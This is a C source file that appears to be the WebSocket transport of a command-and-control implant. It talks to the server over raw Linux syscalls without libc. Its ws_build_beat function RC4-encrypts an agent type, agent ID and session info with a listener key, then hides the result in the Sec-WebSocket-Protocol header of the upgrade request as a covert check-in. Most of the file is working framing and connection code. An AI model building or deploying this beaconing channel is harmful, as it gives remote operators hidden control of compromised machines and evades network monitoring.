#include "ws_connector.h"
#include "crt.h"
#include "types.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// Linux socket constants
#define AF_INET      2
#define SOCK_STREAM  1
#define IPPROTO_TCP  6

// sockaddr_in structure (manual -- no libc headers)
struct ws_sockaddr_in {
    uint16_t sin_family;
    uint16_t sin_port;    // network byte order
    uint32_t sin_addr;    // network byte order
    uint8_t  sin_zero[8];
};

// Base64 alphabet
static const char b64_alphabet[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Base64 index table for decoding (-1 = invalid)
static const signed char b64_rev[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
};

// Compute decoded size from base64 string length (without padding)
static size_t ws_b64_decoded_size(const char* in, size_t in_len) {
    (void)in;
    if (in_len == 0) return 0;
    // Remove trailing padding chars from count
    size_t pad = 0;
    if (in_len >= 1 && in[in_len-1] == '=') pad++;
    if (in_len >= 2 && in[in_len-2] == '=') pad++;
    return (in_len * 3) / 4 - pad;
}

// Base64 decode (standard). Returns decoded length or -1 on error.
int ws_b64_decode(const char* in, size_t in_len, uint8_t* out, size_t out_cap) {
    if (in_len == 0) return 0;
    // Remove trailing padding
    size_t pad = 0;
    if (in_len >= 1 && in[in_len-1] == '=') pad++;
    if (in_len >= 2 && in[in_len-2] == '=') pad++;
    size_t out_len = (in_len * 3) / 4 - pad;
    if (out_cap < out_len) return -1;

    size_t o = 0;
    for (size_t i = 0; i < in_len; i += 4) {
        int a = (i < in_len) ? b64_rev[(unsigned char)in[i]] : 0;
        int b = (i+1 < in_len) ? b64_rev[(unsigned char)in[i+1]] : 0;
        int c = (i+2 < in_len) ? b64_rev[(unsigned char)in[i+2]] : 0;
        int d = (i+3 < in_len) ? b64_rev[(unsigned char)in[i+3]] : 0;
        if (a < 0 || b < 0) return -1;
        if (c < 0 && d < 0) {
            // Two chars: 1 output byte
            if (o < out_cap) out[o++] = (uint8_t)((a << 2) | (b >> 4));
            break;
        }
        if (d < 0) {
            // Three chars: 2 output bytes
            if (o+1 < out_cap) {
                out[o++] = (uint8_t)((a << 2) | (b >> 4));
                out[o++] = (uint8_t)(((b & 0x0F) << 4) | (c >> 2));
            }
            break;
        }
        if (c < 0 || d < 0) break;
        if (o+2 < out_cap) {
            out[o++] = (uint8_t)((a << 2) | (b >> 4));
            out[o++] = (uint8_t)(((b & 0x0F) << 4) | (c >> 2));
            out[o++] = (uint8_t)(((c & 0x03) << 6) | d);
        }
    }
    return (int)out_len;
}

// Base64 encode (standard, not URL-safe)
static int ws_b64_encode(const uint8_t* in, size_t in_len, char* out, size_t out_cap) {
    size_t out_len = ((in_len + 2) / 3) * 4;
    if (out_cap < out_len + 1) return -1;

    size_t i, o = 0;
    for (i = 0; i < in_len; i += 3) {
        uint32_t triple = (uint32_t)in[i] << 16;
        if (i + 1 < in_len) triple |= (uint32_t)in[i + 1] << 8;
        if (i + 2 < in_len) triple |= in[i + 2];
        out[o++] = b64_alphabet[(triple >> 18) & 0x3F];
        out[o++] = b64_alphabet[(triple >> 12) & 0x3F];
        out[o++] = (i + 1 < in_len) ? b64_alphabet[(triple >> 6) & 0x3F] : '=';
        out[o++] = (i + 2 < in_len) ? b64_alphabet[triple & 0x3F] : '=';
    }
    out[o] = '\0';
    return 0;
}

// Parse "host:port" string (IP only, no DNS for nostdlib)
static int ws_parse_address(const char* address, uint32_t* ip, uint16_t* port) {
    const char* colon = (const char*)0;
    for (const char* p = address; *p; p++) {
        if (*p == ':') colon = p;
    }
    if (!colon) return -1;

    uint32_t octets[4] = {0};
    int octet_idx = 0;
    for (const char* p = address; p < colon && octet_idx < 4; p++) {
        if (*p == '.') {
            octet_idx++;
        } else if (*p >= '0' && *p <= '9') {
            octets[octet_idx] = octets[octet_idx] * 10 + (*p - '0');
        } else {
            return -1;
        }
    }
    if (octet_idx != 3) return -1;
    for (int i = 0; i < 4; i++) {
        if (octets[i] > 255) return -1;
    }

    // Network byte order (big-endian)
    *ip = (octets[0]) | (octets[1] << 8) | (octets[2] << 16) | (octets[3] << 24);

    // Parse port
    *port = 0;
    for (const char* p = colon + 1; *p >= '0' && *p <= '9'; p++) {
        *port = *port * 10 + (*p - '0');
    }
    if (*port == 0) return -1;

    // Convert port to network byte order
    *port = ((*port >> 8) & 0xFF) | ((*port & 0xFF) << 8);
    return 0;
}

// Read exactly n bytes from fd
static int ws_read_exact(int fd, uint8_t* buf, size_t size) {
    size_t total = 0;
    while (total < size) {
        long n = sys_read(fd, buf + total, size - total);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

// Write all bytes to fd
static int ws_write_all(int fd, const uint8_t* data, size_t len) {
    size_t total = 0;
    while (total < len) {
        long n = sys_write(fd, data + total, len - total);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

// Generate a random 16-byte key for Sec-WebSocket-Key (base64 of random bytes)
static int ws_generate_key(char* out_key, size_t key_len) {
    uint8_t random[16];
    if (ax_random_bytes(random, 16) != 0) return -1;

    // Base64 encode
    if (ws_b64_encode(random, 16, out_key, key_len) != 0) return -1;
    return 0;
}

// Read HTTP response line and headers until \r\n\r\n
// Reads from fd, stores response in a growable buffer
// Returns 0 on success, -1 on failure
static int ws_read_http_response(int fd, uint8_t** out_buf, size_t* out_len) {
    size_t cap = 4096;
    size_t len = 0;
    uint8_t* buf = (uint8_t*)ax_malloc(cap);
    if (!buf) return -1;

    // Read byte by byte until we see \r\n\r\n
    int found_end = 0;
    while (!found_end) {
        // Grow buffer if needed
        if (len + 1 > cap) {
            cap *= 2;
            uint8_t* nb = (uint8_t*)ax_realloc(buf, cap);
            if (!nb) { ax_free(buf); return -1; }
            buf = nb;
        }

        long n = sys_read(fd, buf + len, 1);
        if (n <= 0) { ax_free(buf); return -1; }
        len++;

        // Check for \r\n\r\n
        if (len >= 4 &&
            buf[len-4] == '\r' && buf[len-3] == '\n' &&
            buf[len-2] == '\r' && buf[len-1] == '\n') {
            found_end = 1;
        }
    }

    *out_buf = buf;
    *out_len = len;
    return 0;
}

// ── RC4 for WS beat encryption ──
// The WS server expects beat = RC4(profile_key, [agentType 4B][agentId 4B][sessionInfo])
// where profile_key is the 16-byte RC4 key from the listener's encrypt_key config.
// The beat is then base64-encoded and placed in Sec-WebSocket-Protocol header.

static void ws_rc4_crypt(const uint8_t* key, size_t key_len,
                          const uint8_t* in, uint8_t* out, size_t len) {
    uint8_t s[256];
    for (int i = 0; i < 256; i++) s[i] = (uint8_t)i;

    // KSA
    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + s[i] + key[i % key_len];
        uint8_t t = s[i]; s[i] = s[j]; s[j] = t;
    }

    // PRGA
    uint8_t a = 0, b = 0;
    for (size_t i = 0; i < len; i++) {
        a = (uint8_t)(a + 1);
        b = b + s[a];
        uint8_t t = s[a]; s[a] = s[b]; s[b] = t;
        out[i] = in[i] ^ s[(uint8_t)(s[a] + s[b])];
    }
}

/// Build a WS beat: RC4(profile_enc_key, [agentType 4B][agentId 4B][sessionInfo])
/// Then b64-encode and place into sec_ws_protocol output buffer.
/// Returns 0 on success, -1 on failure.
int ws_build_beat(const uint8_t* enc_key, uint32_t agent_type, uint32_t agent_id,
                  const uint8_t* session_info, size_t si_len,
                  uint8_t* beat_buf, size_t beat_cap, size_t* beat_out_len) {
    // Build raw beat: [agentType 4B][agentId 4B][sessionInfo]
    size_t raw_len = 4 + 4 + si_len;
    uint8_t* raw = (uint8_t*)ax_malloc(raw_len > 0 ? raw_len : 1);
    if (!raw) return -1;

    raw[0] = (uint8_t)(agent_type >> 24);
    raw[1] = (uint8_t)(agent_type >> 16);
    raw[2] = (uint8_t)(agent_type >> 8);
    raw[3] = (uint8_t)agent_type;
    raw[4] = (uint8_t)(agent_id >> 24);
    raw[5] = (uint8_t)(agent_id >> 16);
    raw[6] = (uint8_t)(agent_id >> 8);
    raw[7] = (uint8_t)agent_id;
    if (si_len > 0)
        ax_memcpy(raw + 8, session_info, si_len);

    // RC4 encrypt with profile key
    uint8_t* enc = (uint8_t*)ax_malloc(raw_len > 0 ? raw_len : 1);
    if (!enc) { ax_free(raw); return -1; }
    ws_rc4_crypt(enc_key, 16, raw, enc, raw_len);

    // Base64 encode
    size_t b64_len = ((raw_len + 2) / 3) * 4;
    if (beat_cap < b64_len + 1) { ax_free(raw); ax_free(enc); return -1; }
    if (ws_b64_encode(enc, raw_len, (char*)beat_buf, beat_cap) != 0) {
        ax_free(raw); ax_free(enc); return -1;
    }

    // Wipe intermediate buffers
    ax_memset(raw, 0, raw_len);
    ax_memset(enc, 0, raw_len);
    ax_free(raw);
    ax_free(enc);

    *beat_out_len = b64_len;
    return 0;
}

// ---- Public API ----

void ws_init(ws_connector_t* ws) {
    ws->fd = -1;
    ws->state = WS_STATE_DISCONNECTED;
    ws->host = (char*)0;
    ws->port = 0;
    ws->use_ssl = 0;
}

int ws_connect(ws_connector_t* ws, const char* host, uint16_t port,
               const char* uri, const char* user_agent,
               const char* sec_ws_protocol, int use_ssl) {
    if (ws->state != WS_STATE_DISCONNECTED) {
        ws_disconnect(ws);
    }

    // Phase 1: No SSL support in nostdlib mode (would need raw TLS handshake)
    // TLS would require a separate library or hand-coded handshake
    if (use_ssl) return -1;

    // Build address string "IP:port"
    // host must be an IP address (no DNS resolution)
    char addr_str[64];
    size_t host_len = ax_strlen(host);
    if (host_len + 8 > sizeof(addr_str)) return -1;
    ax_memcpy(addr_str, host, host_len);
    addr_str[host_len] = ':';
    // Convert port from network byte order to ASCII
    uint16_t host_port = port;
    // Note: port is passed in host byte order from main.c
    char port_str[8];
    int pi = 0, temp = host_port;
    // Convert to decimal string
    if (temp == 0) { port_str[pi++] = '0'; }
    else {
        char rev[8]; int ri = 0;
        while (temp > 0 && ri < 7) { rev[ri++] = '0' + (temp % 10); temp /= 10; }
        while (ri > 0) port_str[pi++] = rev[--ri];
    }
    port_str[pi] = '\0';
    ax_memcpy(addr_str + host_len + 1, port_str, pi + 1);

    // Parse address
    uint32_t ip;
    uint16_t nport;
    if (ws_parse_address(addr_str, &ip, &nport) != 0) return -1;

    // Create TCP socket
    int fd = (int)sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) return -1;

    // Connect
    struct ws_sockaddr_in addr;
    ax_memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = nport;
    addr.sin_addr = ip;

    if (sys_connect(fd, (const void*)&addr, sizeof(addr)) != 0) {
        sys_close(fd);
        return -1;
    }

    // ---- WebSocket HTTP Upgrade ----

    // Generate Sec-WebSocket-Key
    char ws_key[32];
    if (ws_generate_key(ws_key, sizeof(ws_key)) != 0) {
        sys_close(fd);
        return -1;
    }

    // Build HTTP upgrade request
    // Use a dynamic buffer for the request
    size_t req_cap = 2048;
    size_t req_len = 0;
    uint8_t* req = (uint8_t*)ax_malloc(req_cap);
    if (!req) { sys_close(fd); return -1; }

    // Helper to append string
#define WS_APPEND(s) do { \
        size_t slen = ax_strlen(s); \
        if (req_len + slen > req_cap) { \
            req_cap = req_len + slen + 512; \
            uint8_t* nr = (uint8_t*)ax_realloc(req, req_cap); \
            if (!nr) { ax_free(req); sys_close(fd); return -1; } \
            req = nr; \
        } \
        ax_memcpy(req + req_len, s, slen); \
        req_len += slen; \
    } while(0)

    // GET /uri HTTP/1.1
    WS_APPEND("GET ");
    WS_APPEND(uri);
    WS_APPEND(" HTTP/1.1\r\n");

    // Host header
    WS_APPEND("Host: ");
    WS_APPEND(host);
    WS_APPEND(":");
    WS_APPEND(port_str);
    WS_APPEND("\r\n");

    // Upgrade headers
    WS_APPEND("Upgrade: websocket\r\n");
    WS_APPEND("Connection: Upgrade\r\n");

    // Sec-WebSocket-Key
    WS_APPEND("Sec-WebSocket-Key: ");
    WS_APPEND(ws_key);
    WS_APPEND("\r\n");

    // Sec-WebSocket-Version
    WS_APPEND("Sec-WebSocket-Version: 13\r\n");

    // Sec-WebSocket-Protocol (carries the encrypted beat)
    if (sec_ws_protocol && sec_ws_protocol[0]) {
        WS_APPEND("Sec-WebSocket-Protocol: ");
        WS_APPEND(sec_ws_protocol);
        WS_APPEND("\r\n");
    }

    // User-Agent
    if (user_agent && user_agent[0]) {
        WS_APPEND("User-Agent: ");
        WS_APPEND(user_agent);
        WS_APPEND("\r\n");
    }

    // End headers
    WS_APPEND("\r\n");

    // Send HTTP upgrade request
    if (ws_write_all(fd, req, req_len) != 0) {
        ax_free(req);
        sys_close(fd);
        return -1;
    }
    ax_free(req);

    // Read HTTP response
    uint8_t* resp = (uint8_t*)0;
    size_t resp_len = 0;
    if (ws_read_http_response(fd, &resp, &resp_len) != 0) {
        sys_close(fd);
        return -1;
    }

    // Check for HTTP 101 Switching Protocols
    int upgrade_ok = 0;
    // Look for "101" in the first line
    // "HTTP/1.1 101 Switching Protocols\r\n"
    if (resp_len >= 12) {
        // Check for " 101 " or " 101\r\n"
        for (size_t i = 0; i < resp_len - 5; i++) {
            if (resp[i] == ' ' && resp[i+1] == '1' && resp[i+2] == '0' && resp[i+3] == '1' &&
                (resp[i+4] == ' ' || resp[i+4] == '\r')) {
                upgrade_ok = 1;
                break;
            }
        }
    }

    ax_free(resp);

    if (!upgrade_ok) {
        sys_close(fd);
        return -1;
    }

    // Store connection info
    ws->fd = fd;
    ws->state = WS_STATE_CONNECTED;
    ws->use_ssl = use_ssl;

    // Store host for reconnection
    if (ws->host) ax_free(ws->host);
    ws->host = (char*)ax_malloc(ax_strlen(host) + 1);
    if (ws->host) ax_strcpy(ws->host, host);
    ws->port = host_port;

    return 0;
}

// ---- WebSocket Frame I/O ----

// Mask a WebSocket frame payload (RFC 6455 Section 5.3)
static void ws_apply_mask(uint8_t* data, size_t len, const uint8_t mask_key[4]) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= mask_key[i & 3];
    }
}

// Send a WebSocket frame (masked, per RFC 6455)
// fin=1, opcode=WS_OPCODE_BINARY, mask=1
static int ws_send_frame(ws_connector_t* ws, int opcode, const uint8_t* data, size_t len) {
    if (ws->state != WS_STATE_CONNECTED || ws->fd < 0) return -1;

    // Generate random masking key
    uint8_t mask_key[4];
    if (ax_random_bytes(mask_key, 4) != 0) return -1;

    // Build frame header
    // [FIN|RSV|OPCODE(4)] [MASK|PAYLOAD_LEN(7)] [extended len] [masking key] [payload]
    uint8_t header[10 + 4]; // max: 2 header + 8 extended len + 4 mask
    int header_len = 0;

    // First byte: FIN (0x80) | opcode
    header[header_len++] = (uint8_t)(0x80 | (opcode & 0x0F));

    // Second byte: MASK (0x80) | payload length
    // Determine payload length encoding
    if (len < 126) {
        header[header_len++] = (uint8_t)(0x80 | len);
    } else if (len <= 0xFFFF) {
        header[header_len++] = (uint8_t)(0x80 | 126);
        header[header_len++] = (uint8_t)(len >> 8);
        header[header_len++] = (uint8_t)(len & 0xFF);
    } else {
        header[header_len++] = (uint8_t)(0x80 | 127);
        uint64_t len64 = (uint64_t)len;
        for (int i = 7; i >= 0; i--) {
            header[header_len++] = (uint8_t)(len64 >> (i * 8));
        }
    }

    // Masking key
    ax_memcpy(header + header_len, mask_key, 4);
    header_len += 4;

    // Write header
    if (ws_write_all(ws->fd, header, (size_t)header_len) != 0) return -1;

    // If payload exists, mask and send
    if (len > 0) {
        // For small payloads, mask in a stack buffer to avoid allocation
        if (len <= 4096) {
            uint8_t masked[4096];
            ax_memcpy(masked, data, len);
            ws_apply_mask(masked, len, mask_key);
            if (ws_write_all(ws->fd, masked, len) != 0) return -1;
        } else {
            // Large payload: allocate temp buffer
            uint8_t* masked = (uint8_t*)ax_malloc(len);
            if (!masked) return -1;
            ax_memcpy(masked, data, len);
            ws_apply_mask(masked, len, mask_key);
            int ret = ws_write_all(ws->fd, masked, len);
            ax_free(masked);
            if (ret != 0) return -1;
        }
    }

    return 0;
}

// Send binary frame
int ws_send_text(ws_connector_t* ws, const uint8_t* data, size_t len) {
    return ws_send_frame(ws, WS_OPCODE_BINARY, data, len);
}

// Receive a complete WebSocket message (handles fragmentation)
// Allocates *out_data, sets *out_len. Caller must ax_free(*out_data).
// Returns 0 on success, -1 on failure/close
int ws_recv_message(ws_connector_t* ws, uint8_t** out_data, size_t* out_len) {
    if (ws->state != WS_STATE_CONNECTED || ws->fd < 0) return -1;

    *out_data = (uint8_t*)0;
    *out_len = 0;

    uint8_t* msg_buf = (uint8_t*)0;
    size_t msg_len = 0;

    // Read frames until FIN
    while (1) {
        // Read frame header (first 2 bytes minimum)
        uint8_t hdr[2];
        if (ws_read_exact(ws->fd, hdr, 2) != 0) {
            if (msg_buf) ax_free(msg_buf);
            return -1;
        }

        int fin = (hdr[0] & 0x80) ? 1 : 0;
        int opcode = hdr[0] & 0x0F;
        int masked = (hdr[1] & 0x80) ? 1 : 0;
        uint64_t payload_len = hdr[1] & 0x7F;

        // Extended payload length
        if (payload_len == 126) {
            uint8_t ext[2];
            if (ws_read_exact(ws->fd, ext, 2) != 0) { if (msg_buf) ax_free(msg_buf); return -1; }
            payload_len = ((uint64_t)ext[0] << 8) | ext[1];
        } else if (payload_len == 127) {
            uint8_t ext[8];
            if (ws_read_exact(ws->fd, ext, 8) != 0) { if (msg_buf) ax_free(msg_buf); return -1; }
            payload_len = 0;
            for (int i = 0; i < 8; i++) {
                payload_len = (payload_len << 8) | ext[i];
            }
        }

        // Read masking key if present (server frames should NOT be masked per RFC 6455,
        // but we handle it for robustness)
        uint8_t mask_key[4];
        if (masked) {
            if (ws_read_exact(ws->fd, mask_key, 4) != 0) {
                if (msg_buf) ax_free(msg_buf);
                return -1;
            }
        }

        // Handle control frames
        if (opcode == WS_OPCODE_CLOSE) {
            // Read and discard payload
            uint8_t discard_buf[256];
            uint64_t remaining = payload_len;
            while (remaining > 0) {
                size_t chunk = remaining < sizeof(discard_buf) ? (size_t)remaining : sizeof(discard_buf);
                if (ws_read_exact(ws->fd, discard_buf, chunk) != 0) {
                    if (msg_buf) ax_free(msg_buf);
                    return -1;
                }
                remaining -= chunk;
            }
            // Send close frame back
            ws_send_frame(ws, WS_OPCODE_CLOSE, (const uint8_t*)"", 0);
            ws->state = WS_STATE_DISCONNECTED;
            if (msg_buf) ax_free(msg_buf);
            return -1; // Connection closed
        }

        if (opcode == WS_OPCODE_PING) {
            // Read payload
            uint8_t ping_buf[256];
            size_t ping_len = payload_len < sizeof(ping_buf) ? (size_t)payload_len : sizeof(ping_buf);
            if (ws_read_exact(ws->fd, ping_buf, ping_len) != 0) {
                if (msg_buf) ax_free(msg_buf);
                return -1;
            }
            // Discard remainder
            uint64_t skip = payload_len - ping_len;
            while (skip > 0) {
                uint8_t dbuf[64];
                size_t chunk = skip < sizeof(dbuf) ? (size_t)skip : sizeof(dbuf);
                if (ws_read_exact(ws->fd, dbuf, chunk) != 0) break;
                skip -= chunk;
            }
            // Send pong
            ws_send_frame(ws, WS_OPCODE_PONG, ping_buf, ping_len);
            continue; // Continue reading next frame
        }

        if (opcode == WS_OPCODE_PONG) {
            // Read and discard
            uint8_t discard_buf[256];
            uint64_t remaining = payload_len;
            while (remaining > 0) {
                size_t chunk = remaining < sizeof(discard_buf) ? (size_t)remaining : sizeof(discard_buf);
                if (ws_read_exact(ws->fd, discard_buf, chunk) != 0) {
                    if (msg_buf) ax_free(msg_buf);
                    return -1;
                }
                remaining -= chunk;
            }
            continue; // Continue reading
        }

        // Data frame (text or binary)
        if (payload_len == 0 && fin && msg_buf == (uint8_t*)0) {
            // Empty message
            *out_data = (uint8_t*)0;
            *out_len = 0;
            return 0;
        }

        // Sanity check payload size (max 64MB)
        if (payload_len > 64 * 1024 * 1024) {
            if (msg_buf) ax_free(msg_buf);
            return -1;
        }

        // Read payload
        size_t payload_size = (size_t)payload_len;
        uint8_t* payload = (uint8_t*)ax_malloc(payload_size > 0 ? payload_size : 1);
        if (!payload) { if (msg_buf) ax_free(msg_buf); return -1; }

        if (payload_size > 0) {
            if (ws_read_exact(ws->fd, payload, payload_size) != 0) {
                ax_free(payload);
                if (msg_buf) ax_free(msg_buf);
                return -1;
            }

            // Unmask if masked
            if (masked) {
                ws_apply_mask(payload, payload_size, mask_key);
            }
        }

        // Append to full message (handle fragmentation)
        if (msg_buf == (uint8_t*)0) {
            msg_buf = payload;
            msg_len = payload_size;
        } else {
            size_t new_len = msg_len + payload_size;
            uint8_t* new_msg = (uint8_t*)ax_realloc(msg_buf, new_len > 0 ? new_len : 1);
            if (!new_msg) { ax_free(payload); ax_free(msg_buf); return -1; }
            ax_memcpy(new_msg + msg_len, payload, payload_size);
            msg_buf = new_msg;
            msg_len = new_len;
            ax_free(payload);
        }

        if (fin) break; // Last frame
    }

    *out_data = msg_buf;
    *out_len = msg_len;
    return 0;
}

// Receive with poll timeout
int ws_recv_message_timeout(ws_connector_t* ws, uint8_t** out_data, size_t* out_len, int timeout_ms) {
    *out_data = (uint8_t*)0;
    *out_len = 0;

    int poll = ws_poll_read(ws, timeout_ms);
    if (poll <= 0) return poll; // 0 = timeout, -1 = error

    return ws_recv_message(ws, out_data, out_len);
}

int ws_poll_read(ws_connector_t* ws, int timeout_ms) {
    if (ws->fd < 0 || ws->state != WS_STATE_CONNECTED) return -1;

    // fd_set manipulation matching connector.c pattern
    typedef struct {
        unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))];
    } ws_fdset_t;

    ws_fdset_t rfds;
    // Zero the set
    for (unsigned i = 0; i < sizeof(rfds.fds_bits) / sizeof(rfds.fds_bits[0]); i++)
        rfds.fds_bits[i] = 0;

    // Set fd
    unsigned idx = (unsigned)ws->fd / (8 * sizeof(unsigned long));
    unsigned bit = (unsigned)ws->fd % (8 * sizeof(unsigned long));
    rfds.fds_bits[idx] |= (1UL << bit);

    struct linux_timespec ts;
    ts.tv_sec = timeout_ms / 1000;
    ts.tv_nsec = (long)(timeout_ms % 1000) * 1000000L;

    int ret = sys_pselect6(ws->fd + 1, (void*)&rfds, (void*)0, (void*)0, &ts, (void*)0);
    if (ret < 0) return -1;
    if (ret == 0) return 0;
    return 1;
}

void ws_disconnect(ws_connector_t* ws) {
    if (ws->fd >= 0) {
        sys_close(ws->fd);
        ws->fd = -1;
    }
    ws->state = WS_STATE_DISCONNECTED;
    if (ws->host) {
        ax_free(ws->host);
        ws->host = (char*)0;
    }
    ws->port = 0;
}
